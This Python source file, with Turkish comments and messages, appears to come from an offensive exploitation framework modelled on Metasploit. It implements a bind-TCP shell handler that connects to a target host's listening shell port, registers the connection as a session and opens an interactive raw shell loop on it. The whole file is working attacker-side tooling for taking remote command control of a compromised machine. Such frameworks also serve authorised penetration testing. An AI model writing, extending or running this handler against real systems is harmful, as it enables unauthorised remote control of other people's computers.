import socket

from rich import print

from core.handler import BaseHandler


class Handler(BaseHandler):
    """
    Python Bind TCP Handler.
    Hedef sistemdeki porta bağlanır; shell MultiHandler/sessions -i ile açılır.
    """

    def start(self):
        """
        Bind shell için özel start metodu.
        Dinlemek yerine, hedefe (RHOST) bağlanır.
        """
        rhost = self.options.get("RHOST")
        lport = self.lport

        if not rhost:
            print("[!] RHOST belirtilmedi! Bind shell için RHOST gereklidir.")
            return

        print(f"[*] Hedefe bağlanılıyor: {rhost}:{lport}...")

        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((rhost, lport))
            self.running = True
            self.client_sock = self.sock
            print("[+] Bağlantı sağlandı!")

            # Session kaydı (MultiHandler interact için)
            from core.shared_state import shared_state

            session_id = None
            if shared_state.session_manager:
                session_id = shared_state.session_manager.add_session(
                    self,
                    {"host": rhost, "port": lport, "type": self.__class__.__name__},
                )
                print(f"[*] Oturum açıldı: Session {session_id}")

            self.handle_connection(self.sock, session_id)

        except ConnectionRefusedError:
            print(
                "[!] Bağlantı reddedildi. Hedef port kapalı olabilir veya henüz açılmamış."
            )
        except Exception as e:
            print(f"[!] Bağlantı hatası: {e}")
        finally:
            self.stop()

    def handle_connection(self, client_sock, session_id=None):
        self.client_sock = client_sock
        print(f"[*] Shell oturumu hazır (Session: {session_id}).")
        if session_id is not None:
            print(f"[*] Etkileşim için: sessions -i {session_id}")
        self.keep_connection_alive(client_sock)

    def interact(self, session_id: int):
        sock = self.resolve_client_sock(session_id) or self.client_sock
        if not sock:
            print(f"[!] Session {session_id}: aktif soket yok.")
            return
        self.raw_shell_loop(sock, session_id=session_id)
